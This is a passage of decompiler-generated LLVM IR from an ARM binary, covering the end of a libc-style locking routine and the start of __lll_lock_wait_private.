dec_label_pc_15d84:                               ; preds = %dec_label_pc_15d50, %dec_label_pc_15d6c.dec_label_pc_15d60_crit_edge, %dec_label_pc_15d80
  %v0_15d84 = phi i32 [ %v0_15d80, %dec_label_pc_15d80 ], [ %v2_15d60120, %dec_label_pc_15d50 ], [ %v2_15d60, %dec_label_pc_15d6c.dec_label_pc_15d60_crit_edge ]
  %v1_15d84 = phi i32 [ %v0_15d80, %dec_label_pc_15d80 ], [ %v3_15d50, %dec_label_pc_15d50 ], [ %v1_15d64.pre, %dec_label_pc_15d6c.dec_label_pc_15d60_crit_edge ]
  %v3_15d84 = icmp uge i32 %v0_15d84, %v1_15d84
  store i1 %v3_15d84, i1* %cpsr_c.global-to-local, align 1
  %v9_15d84 = icmp eq i32 %v0_15d84, %v1_15d84
  store i32 %v2_15d2c, i32* %r4.global-to-local, align 4
  br i1 %v9_15d84, label %dec_label_pc_15d1c, label %dec_label_pc_15d84.dec_label_pc_15d50_crit_edge

dec_label_pc_15d84.dec_label_pc_15d50_crit_edge:  ; preds = %dec_label_pc_15d84
  %v0_15d50.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_15d54.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15d50

dec_label_pc_15da0:                               ; preds = %dec_label_pc_15d94.backedge, %entry
  %v0_15da831 = phi i32 [ ptrtoint (i32* @global_var_240f8.537 to i32), %entry ], [ %v0_15d94, %dec_label_pc_15d94.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15da4.loopexit:                      ; preds = %bb72
  store i32 %v2_15d2c, i32* %r6.global-to-local, align 4
  %v0_15da8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15da4.loopexit, %dec_label_pc_15da0
  %v0_15da8 = phi i32 [ %v0_15da8.pre, %dec_label_pc_15da4.loopexit ], [ %v0_15da831, %dec_label_pc_15da0 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15da8 = add i32 %v0_15da8, 152
  %v3_15da8 = inttoptr i32 %v2_15da8 to i32*
  %v4_15da8 = load i32, i32* %v3_15da8, align 4
  store i32 %v4_15da8, i32* %r7.global-to-local, align 4
  %v0_15dac = call i32 @__aeabi_read_tp()
  store i32 %v0_15dac, i32* %r0.global-to-local, align 4
  %v1_15db0 = add i32 %v4_15da8, 8
  %v2_15db0 = inttoptr i32 %v1_15db0 to i32*
  %v3_15db0 = load i32, i32* %v2_15db0, align 4
  store i32 %v3_15db0, i32* %r3.global-to-local, align 4
  %v1_15db4 = add i32 %v0_15dac, -1168
  store i32 %v1_15db4, i32* %r5.global-to-local, align 4
  %v3_15db8 = icmp uge i32 %v3_15db0, %v1_15db4
  store i1 %v3_15db8, i1* %cpsr_c.global-to-local, align 1
  %v9_15db8 = icmp eq i32 %v3_15db0, %v1_15db4
  br i1 %v9_15db8, label %dec_label_pc_15f20, label %dec_label_pc_15dc0

dec_label_pc_15dc0:                               ; preds = %dec_label_pc_15da4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_15da8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_15dcc112 = inttoptr i32 %v4_15da8 to i32*
  %v2_15dcc113 = load i32, i32* %v1_15dcc112, align 4
  store i32 %v2_15dcc113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15dd0115 = icmp eq i32 %v2_15dcc113, 0
  br i1 %v9_15dd0115, label %dec_label_pc_15dd8, label %dec_label_pc_15df0

dec_label_pc_15dd8:                               ; preds = %dec_label_pc_15dc0, %dec_label_pc_15dd8.dec_label_pc_15dcc_crit_edge
  %v0_15dd8116 = phi i32 [ %v1_15dd0.pre, %dec_label_pc_15dd8.dec_label_pc_15dcc_crit_edge ], [ 0, %dec_label_pc_15dc0 ]
  store i32 %v0_15dd8116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15de8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15de8, label %dec_label_pc_15dec, label %dec_label_pc_15dd8.dec_label_pc_15dcc_crit_edge

dec_label_pc_15dd8.dec_label_pc_15dcc_crit_edge:  ; preds = %dec_label_pc_15dd8
  %v0_15dcc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15dd0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15dcc = inttoptr i32 %v0_15dcc.pre to i32*
  %v2_15dcc = load i32, i32* %v1_15dcc, align 4
  store i32 %v2_15dcc, i32* %r3.global-to-local, align 4
  %v3_15dd0 = icmp uge i32 %v2_15dcc, %v1_15dd0.pre
  store i1 %v3_15dd0, i1* %cpsr_c.global-to-local, align 1
  %v9_15dd0 = icmp eq i32 %v2_15dcc, %v1_15dd0.pre
  br i1 %v9_15dd0, label %dec_label_pc_15dd8, label %dec_label_pc_15df0

dec_label_pc_15dec:                               ; preds = %dec_label_pc_15dd8
  %v0_15dec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15dec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15df0

dec_label_pc_15df0:                               ; preds = %dec_label_pc_15dc0, %dec_label_pc_15dd8.dec_label_pc_15dcc_crit_edge, %dec_label_pc_15dec
  %v0_15df0 = phi i32 [ %v0_15dec, %dec_label_pc_15dec ], [ %v2_15dcc113, %dec_label_pc_15dc0 ], [ %v2_15dcc, %dec_label_pc_15dd8.dec_label_pc_15dcc_crit_edge ]
  %v1_15df0 = phi i32 [ %v0_15dec, %dec_label_pc_15dec ], [ 0, %dec_label_pc_15dc0 ], [ %v1_15dd0.pre, %dec_label_pc_15dd8.dec_label_pc_15dcc_crit_edge ]
  %v3_15df0 = icmp uge i32 %v0_15df0, %v1_15df0
  store i1 %v3_15df0, i1* %cpsr_c.global-to-local, align 1
  %v9_15df0 = icmp eq i32 %v0_15df0, %v1_15df0
  br i1 %v9_15df0, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_15df0
  %v1_15df4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15df4, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_15df0, %bb73
  %v1_15df8 = xor i1 %v9_15df0, true
  call void @__pseudo_cond_branch(i1 %v1_15df8, i32 ptrtoint (i32* @global_var_16070.705 to i32))
  %v0_15dfc = load i32, i32* %r5.global-to-local, align 4
  %v1_15dfc = load i32, i32* %r7.global-to-local, align 4
  %v2_15dfc = add i32 %v1_15dfc, 8
  %v3_15dfc = inttoptr i32 %v2_15dfc to i32*
  store i32 %v0_15dfc, i32* %v3_15dfc, align 4
  br label %dec_label_pc_15f20

dec_label_pc_15f20:                               ; preds = %bb74, %dec_label_pc_15da4
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_15e04 = load i32, i32* %r8.global-to-local, align 4
  %v2_15e04 = add i32 %v0_15e04, 152
  %v3_15e04 = inttoptr i32 %v2_15e04 to i32*
  %v4_15e04 = load i32, i32* %v3_15e04, align 4
  store i32 %v4_15e04, i32* %r2.global-to-local, align 4
  %v1_15e08 = add i32 %v4_15e04, 4
  %v2_15e08 = inttoptr i32 %v1_15e08 to i32*
  %v3_15e08 = load i32, i32* %v2_15e08, align 4
  %v1_15e0c = add i32 %v3_15e08, 1
  store i32 %v1_15e0c, i32* %r3.global-to-local, align 4
  store i32 %v1_15e0c, i32* %v2_15e08, align 4
  %v0_15e14 = load i32, i32* %r5.global-to-local, align 4
  %v1_15e14 = add i32 %v0_15e14, 108
  %v2_15e14 = inttoptr i32 %v1_15e14 to i32*
  %v3_15e14 = load i32, i32* %v2_15e14, align 4
  store i32 %v3_15e14, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_15e1c = sub i32 0, %v3_15e14
  store i32 %v1_15e1c, i32* %v2_15e14, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_15e30 = load i32, i32* %r5.global-to-local, align 4
  %v1_15e30 = add i32 %v0_15e30, 104
  store i32 %v1_15e30, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_15f24.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15f24 = add i32 %v0_15e30, 108
  %v3_15f24 = inttoptr i32 %v2_15f24 to i32*
  store i32 %v0_15f24.pre, i32* %v3_15f24, align 4
  %v0_15f28 = load i32, i32* %r8.global-to-local, align 4
  %v1_15f28 = load i32, i32* %r3.global-to-local, align 4
  %v2_15f28 = add i32 %v1_15f28, %v0_15f28
  %v3_15f28 = inttoptr i32 %v2_15f28 to i32*
  %v4_15f28 = load i32, i32* %v3_15f28, align 4
  store i32 %v4_15f28, i32* %r0.global-to-local, align 4
  %v1_15f2c = add i32 %v4_15f28, 4
  %v2_15f2c = inttoptr i32 %v1_15f2c to i32*
  %v3_15f2c = load i32, i32* %v2_15f2c, align 4
  %v1_15f30 = add i32 %v3_15f2c, -1
  store i32 %v1_15f30, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f34 = icmp eq i32 %v1_15f30, 0
  store i32 %v1_15f30, i32* %v2_15f2c, align 4
  br i1 %v2_15f34, label %dec_label_pc_15f40, label %dec_label_pc_16030thread-pre-split

dec_label_pc_15f40:                               ; preds = %dec_label_pc_15f20
  %v0_15f40 = load i32, i32* %r3.global-to-local, align 4
  %v1_15f40 = load i32, i32* %r0.global-to-local, align 4
  %v2_15f40 = add i32 %v1_15f40, 8
  %v3_15f40 = inttoptr i32 %v2_15f40 to i32*
  store i32 %v0_15f40, i32* %v3_15f40, align 4
  %v0_15f44 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15f44, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15f48

dec_label_pc_15f48:                               ; preds = %dec_label_pc_15f78.dec_label_pc_15f48_crit_edge, %dec_label_pc_15f40
  %v0_15f48 = phi i32 [ %v0_15f48.pre, %dec_label_pc_15f78.dec_label_pc_15f48_crit_edge ], [ %v0_15f44, %dec_label_pc_15f40 ]
  %v1_15f48 = inttoptr i32 %v0_15f48 to i32*
  %v2_15f48 = load i32, i32* %v1_15f48, align 4
  store i32 %v2_15f48, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15f48, i32* %r2.global-to-local, align 4
  %v2_15f54100 = load i32, i32* %v1_15f48, align 4
  store i32 %v2_15f54100, i32* %r3.global-to-local, align 4
  %v3_15f58102 = icmp uge i32 %v2_15f54100, %v2_15f48
  store i1 %v3_15f58102, i1* %cpsr_c.global-to-local, align 1
  %v9_15f58108 = icmp eq i32 %v2_15f54100, %v2_15f48
  br i1 %v9_15f58108, label %dec_label_pc_15f60, label %dec_label_pc_15f78

dec_label_pc_15f60:                               ; preds = %dec_label_pc_15f48, %dec_label_pc_15f60.dec_label_pc_15f54_crit_edge
  %v0_15f60109 = phi i32 [ %v1_15f58.pre, %dec_label_pc_15f60.dec_label_pc_15f54_crit_edge ], [ %v2_15f48, %dec_label_pc_15f48 ]
  store i32 %v0_15f60109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15f70 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15f70, label %dec_label_pc_15f74, label %dec_label_pc_15f60.dec_label_pc_15f54_crit_edge

dec_label_pc_15f60.dec_label_pc_15f54_crit_edge:  ; preds = %dec_label_pc_15f60
  %v0_15f54.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15f58.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15f54 = inttoptr i32 %v0_15f54.pre to i32*
  %v2_15f54 = load i32, i32* %v1_15f54, align 4
  store i32 %v2_15f54, i32* %r3.global-to-local, align 4
  %v3_15f58 = icmp uge i32 %v2_15f54, %v1_15f58.pre
  store i1 %v3_15f58, i1* %cpsr_c.global-to-local, align 1
  %v9_15f58 = icmp eq i32 %v2_15f54, %v1_15f58.pre
  br i1 %v9_15f58, label %dec_label_pc_15f60, label %dec_label_pc_15f78

dec_label_pc_15f74:                               ; preds = %dec_label_pc_15f60
  %v0_15f74 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15f74, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15f78

dec_label_pc_15f78:                               ; preds = %dec_label_pc_15f48, %dec_label_pc_15f60.dec_label_pc_15f54_crit_edge, %dec_label_pc_15f74
  %v0_15f80 = phi i32 [ %v0_15f74, %dec_label_pc_15f74 ], [ %v2_15f54100, %dec_label_pc_15f48 ], [ %v2_15f54, %dec_label_pc_15f60.dec_label_pc_15f54_crit_edge ]
  %v1_15f78 = phi i32 [ %v0_15f74, %dec_label_pc_15f74 ], [ %v2_15f48, %dec_label_pc_15f48 ], [ %v1_15f58.pre, %dec_label_pc_15f60.dec_label_pc_15f54_crit_edge ]
  %v3_15f78 = icmp uge i32 %v0_15f80, %v1_15f78
  store i1 %v3_15f78, i1* %cpsr_c.global-to-local, align 1
  %v9_15f78 = icmp eq i32 %v0_15f80, %v1_15f78
  br i1 %v9_15f78, label %dec_label_pc_15f80, label %dec_label_pc_15f78.dec_label_pc_15f48_crit_edge

dec_label_pc_15f78.dec_label_pc_15f48_crit_edge:  ; preds = %dec_label_pc_15f78
  %v0_15f48.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15f48

dec_label_pc_15f80:                               ; preds = %dec_label_pc_15f78
  %v2_15f80 = icmp ne i32 %v1_15f78, 0
  store i1 %v2_15f80, i1* %cpsr_c.global-to-local, align 1
  %v7_15f84 = icmp slt i32 %v1_15f78, 2
  br i1 %v7_15f84, label %dec_label_pc_16030thread-pre-split, label %dec_label_pc_15f88

dec_label_pc_15f88:                               ; preds = %dec_label_pc_15f80
  %v0_15f88 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15f88, i32* %r0.global-to-local, align 4
  %v0_15f8c = load i32, i32* %r1.global-to-local, align 4
  %v1_15f8c = add i32 %v0_15f8c, 129
  store i32 %v1_15f8c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16030thread-pre-split

dec_label_pc_15fa4:                               ; preds = %dec_label_pc_16030thread-pre-split, %dec_label_pc_1602c
  %v0_15fa4 = phi i32 [ %v3_1602c, %dec_label_pc_1602c ], [ %v0_16030.pr, %dec_label_pc_16030thread-pre-split ]
  %v1_15fa4 = inttoptr i32 %v0_15fa4 to i32*
  %v2_15fa4 = load i32, i32* %v1_15fa4, align 4
  store i32 %v2_15fa4, i32* %r3.global-to-local, align 4
  %v1_15fa8 = add i32 %v2_15fa4, 8
  %v2_15fa8 = inttoptr i32 %v1_15fa8 to i32*
  %v3_15fa8 = load i32, i32* %v2_15fa8, align 4
  store i32 %v3_15fa8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15fac = icmp eq i32 %v3_15fa8, 0
  br i1 %v2_15fac, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_15fa4
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_15fa4, %bb75
  %v2_15fb4 = xor i1 %v2_15fac, true
  call void @__pseudo_cond_branch(i1 %v2_15fb4, i32 %v3_15fa8)
  %v0_15fb8 = load i32, i32* %r6.global-to-local, align 4
  %v1_15fb8 = inttoptr i32 %v0_15fb8 to i32*
  %v2_15fb8 = load i32, i32* %v1_15fb8, align 4
  store i32 %v2_15fb8, i32* %r5.global-to-local, align 4
  %v1_15fbc = add i32 %v2_15fb8, 20
  store i32 %v1_15fbc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15fc0

dec_label_pc_15fc0:                               ; preds = %dec_label_pc_15ff4.dec_label_pc_15fc0_crit_edge, %bb76
  %v0_15fc4 = phi i32 [ %v0_15fc4.pre, %dec_label_pc_15ff4.dec_label_pc_15fc0_crit_edge ], [ %v1_15fbc, %bb76 ]
  %v0_15fc0 = phi i32 [ %v0_15fc0.pre, %dec_label_pc_15ff4.dec_label_pc_15fc0_crit_edge ], [ %v2_15fb8, %bb76 ]
  %v1_15fc0 = add i32 %v0_15fc0, 20
  %v2_15fc0 = inttoptr i32 %v1_15fc0 to i32*
  %v3_15fc0 = load i32, i32* %v2_15fc0, align 4
  store i32 %v0_15fc4, i32* %r2.global-to-local, align 4
  store i32 %v3_15fc0, i32* %r4.global-to-local, align 4
  %v1_15fcc = add i32 %v3_15fc0, -1
  store i32 %v1_15fcc, i32* %r1.global-to-local, align 4
  %v1_15fd087 = inttoptr i32 %v0_15fc4 to i32*
  %v2_15fd088 = load i32, i32* %v1_15fd087, align 4
  store i32 %v2_15fd088, i32* %r3.global-to-local, align 4
  %v3_15fd490 = icmp uge i32 %v2_15fd088, %v3_15fc0
  store i1 %v3_15fd490, i1* %cpsr_c.global-to-local, align 1
  %v9_15fd496 = icmp eq i32 %v2_15fd088, %v3_15fc0
  br i1 %v9_15fd496, label %dec_label_pc_15fdc, label %dec_label_pc_15ff4

dec_label_pc_15fdc:                               ; preds = %dec_label_pc_15fc0, %dec_label_pc_15fdc.dec_label_pc_15fd0_crit_edge
  %v0_15fdc97 = phi i32 [ %v1_15fd4.pre, %dec_label_pc_15fdc.dec_label_pc_15fd0_crit_edge ], [ %v3_15fc0, %dec_label_pc_15fc0 ]
  store i32 %v0_15fdc97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15fec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15fec, label %dec_label_pc_15ff0, label %dec_label_pc_15fdc.dec_label_pc_15fd0_crit_edge

dec_label_pc_15fdc.dec_label_pc_15fd0_crit_edge:  ; preds = %dec_label_pc_15fdc
  %v0_15fd0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15fd4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15fd0 = inttoptr i32 %v0_15fd0.pre to i32*
  %v2_15fd0 = load i32, i32* %v1_15fd0, align 4
  store i32 %v2_15fd0, i32* %r3.global-to-local, align 4
  %v3_15fd4 = icmp uge i32 %v2_15fd0, %v1_15fd4.pre
  store i1 %v3_15fd4, i1* %cpsr_c.global-to-local, align 1
  %v9_15fd4 = icmp eq i32 %v2_15fd0, %v1_15fd4.pre
  br i1 %v9_15fd4, label %dec_label_pc_15fdc, label %dec_label_pc_15ff4

dec_label_pc_15ff0:                               ; preds = %dec_label_pc_15fdc
  %v0_15ff0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15ff0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15ff4

dec_label_pc_15ff4:                               ; preds = %dec_label_pc_15fc0, %dec_label_pc_15fdc.dec_label_pc_15fd0_crit_edge, %dec_label_pc_15ff0
  %v0_16000 = phi i32 [ %v0_15ff0, %dec_label_pc_15ff0 ], [ %v2_15fd088, %dec_label_pc_15fc0 ], [ %v2_15fd0, %dec_label_pc_15fdc.dec_label_pc_15fd0_crit_edge ]
  %v1_15ff4 = phi i32 [ %v0_15ff0, %dec_label_pc_15ff0 ], [ %v3_15fc0, %dec_label_pc_15fc0 ], [ %v1_15fd4.pre, %dec_label_pc_15fdc.dec_label_pc_15fd0_crit_edge ]
  %v3_15ff4 = icmp uge i32 %v0_16000, %v1_15ff4
  store i1 %v3_15ff4, i1* %cpsr_c.global-to-local, align 1
  %v9_15ff4 = icmp eq i32 %v0_16000, %v1_15ff4
  store i32 %v0_16000, i32* %r2.global-to-local, align 4
  br i1 %v9_15ff4, label %dec_label_pc_16000, label %dec_label_pc_15ff4.dec_label_pc_15fc0_crit_edge

dec_label_pc_15ff4.dec_label_pc_15fc0_crit_edge:  ; preds = %dec_label_pc_15ff4
  %v0_15fc0.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_15fc4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15fc0

dec_label_pc_16000:                               ; preds = %dec_label_pc_15ff4
  %v2_16000 = icmp ne i32 %v1_15ff4, 0
  store i1 %v2_16000, i1* %cpsr_c.global-to-local, align 1
  %v7_16000 = icmp eq i32 %v1_15ff4, 1
  %v0_16008 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_16000, label %dec_label_pc_16008, label %dec_label_pc_1602c

dec_label_pc_16008:                               ; preds = %dec_label_pc_16000
  %v1_16008 = inttoptr i32 %v0_16008 to i32*
  %v2_16008 = load i32, i32* %v1_16008, align 4
  store i32 %v2_16008, i32* %r1.global-to-local, align 4
  %v1_1600c = add i32 %v2_16008, 24
  %v2_1600c = inttoptr i32 %v1_1600c to i32*
  %v3_1600c = load i32, i32* %v2_1600c, align 4
  store i32 %v3_1600c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16010 = icmp eq i32 %v3_1600c, 0
  br i1 %v2_16010, label %dec_label_pc_1602c, label %dec_label_pc_16018

dec_label_pc_16018:                               ; preds = %dec_label_pc_16008
  %v1_16018 = add i32 %v2_16008, 20
  %v2_16018 = inttoptr i32 %v1_16018 to i32*
  %v3_16018 = load i32, i32* %v2_16018, align 4
  store i32 %v3_16018, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1602c

dec_label_pc_1602c:                               ; preds = %dec_label_pc_16000, %dec_label_pc_16018, %dec_label_pc_16008
  %v1_1602c = add i32 %v0_16008, 4
  %v2_1602c = inttoptr i32 %v1_1602c to i32*
  %v3_1602c = load i32, i32* %v2_1602c, align 4
  store i32 %v3_1602c, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16030 = icmp eq i32 %v3_1602c, 0
  br i1 %v2_16030, label %dec_label_pc_16038, label %dec_label_pc_15fa4

dec_label_pc_16030thread-pre-split:               ; preds = %dec_label_pc_15f88, %dec_label_pc_15f80, %dec_label_pc_15f20
  %v0_16030.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1603011 = icmp eq i32 %v0_16030.pr, 0
  br i1 %v2_1603011, label %dec_label_pc_16038, label %dec_label_pc_15fa4

dec_label_pc_16038:                               ; preds = %dec_label_pc_1602c, %dec_label_pc_16030thread-pre-split
  %v0_16038.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16038.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_16038.pre

; uselistorder directives
  uselistorder i32 %v0_16030.pr, { 1, 0 }
  uselistorder i32 %v3_1602c, { 1, 2, 0 }
  uselistorder i32 %v1_15ff4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15ff0, { 1, 0, 2 }
  uselistorder i32 %v1_15fd4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15f74, { 1, 0, 2 }
  uselistorder i32 %v1_15f58.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15f48, { 1, 0 }
  uselistorder i32 %v0_15dec, { 1, 0, 2 }
  uselistorder i32 %v1_15dd0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_15da8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_15d80, { 1, 0, 2 }
  uselistorder i32 %v1_15d64.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_15d2c, { 1, 0, 2 }
  uselistorder i32 %v0_15d0c, { 1, 0, 2 }
  uselistorder i32 %v1_15cf0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v3_15cd0, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32* %r8.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 11, 12, 13, 14, 1, 3, 2, 4, 5, 6, 7, 8, 10, 9, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 8, 9, 11, 10, 12, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 13, 12, 14, 16, 15, 17, 0, 2, 1, 3, 4, 6, 5, 7, 8, 10, 9, 11 }
  uselistorder i32* %r3.global-to-local, { 22, 23, 24, 26, 25, 17, 27, 28, 29, 30, 32, 31, 18, 33, 34, 0, 1, 2, 3, 4, 6, 5, 19, 7, 8, 9, 11, 10, 20, 12, 13, 15, 14, 21, 16 }
  uselistorder i32* %r2.global-to-local, { 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 0, 1, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 8, 9, 10, 11, 12, 13, 0, 1, 2, 5, 3, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 27, 21, 22, 23, 25, 24, 13, 26, 28, 29, 31, 30, 14, 32, 2, 3, 15, 16, 4, 5, 6, 17, 18, 7, 8, 9, 10, 19, 20, 12, 11, 1 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_16038, { 1, 0 }
  uselistorder label %dec_label_pc_1602c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15ff4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15fdc, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_15f78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15f60, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_15df0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15dd8, { 1, 0 }
  uselistorder label %dec_label_pc_15d84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d6c, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_15d10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15cf8, { 1, 0 }
  uselistorder label %dec_label_pc_15d94.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15cc4, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16070 = load i32, i32* @r4, align 4
  store i32 %v3_16070, i32* %stack_var_-16, align 4
  %v0_16074 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16074, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16078

dec_label_pc_16078:                               ; preds = %dec_label_pc_160f8.dec_label_pc_16078_crit_edge, %entry
  %v0_1607c = phi i32 [ %v0_1607c.pre, %dec_label_pc_160f8.dec_label_pc_16078_crit_edge ], [ %v0_16074, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_1607c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_1608417 = inttoptr i32 %v0_1607c to i32*
  %v2_1608418 = load i32, i32* %v1_1608417, align 4
  %v3_1608820 = icmp ne i32 %v2_1608418, 0
  store i1 %v3_1608820, i1* %cpsr_c.global-to-local, align 1
  %v9_1608826 = icmp eq i32 %v2_1608418, 1
  br i1 %v9_1608826, label %dec_label_pc_16090, label %dec_label_pc_160a8

dec_label_pc_16090:                               ; preds = %dec_label_pc_16078, %dec_label_pc_16090.dec_label_pc_16084_crit_edge
  %v0_1609027 = phi i32 [ %v1_16088.pre, %dec_label_pc_16090.dec_label_pc_16084_crit_edge ], [ 1, %dec_label_pc_16078 ]
  store i32 %v0_1609027, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_160a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_160a0, label %dec_label_pc_160a4, label %dec_label_pc_16090.dec_label_pc_16084_crit_edge

dec_label_pc_16090.dec_label_pc_16084_crit_edge:  ; preds = %dec_label_pc_16090
  %v0_16084.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16088.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16084 = inttoptr i32 %v0_16084.pre to i32*
  %v2_16084 = load i32, i32* %v1_16084, align 4
  %v3_16088 = icmp uge i32 %v2_16084, %v1_16088.pre
  store i1 %v3_16088, i1* %cpsr_c.global-to-local, align 1
  %v9_16088 = icmp eq i32 %v2_16084, %v1_16088.pre
  br i1 %v9_16088, label %dec_label_pc_16090, label %dec_label_pc_160a8

dec_label_pc_160a4:                               ; preds = %dec_label_pc_16090
  %v0_160a4 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_160a8

dec_label_pc_160a8:                               ; preds = %dec_label_pc_16078, %dec_label_pc_16090.dec_label_pc_16084_crit_edge, %dec_label_pc_160a4
